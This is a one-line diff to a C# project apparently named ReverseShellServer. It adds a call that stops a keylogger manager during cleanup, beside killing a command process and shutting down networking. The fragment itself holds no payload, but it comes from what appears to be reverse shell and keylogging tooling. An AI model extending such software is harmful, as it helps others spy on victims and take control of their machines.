@@ -152,6 +152,7 @@ namespace ReverseShellServer
             try
             {
                 processCmd.Kill();
+                MainWindow.keyLoggerManager.Stop();
                 GlobalNetworkManager.ServerNetworkManager.Cleanup();
             }
             catch (Exception)
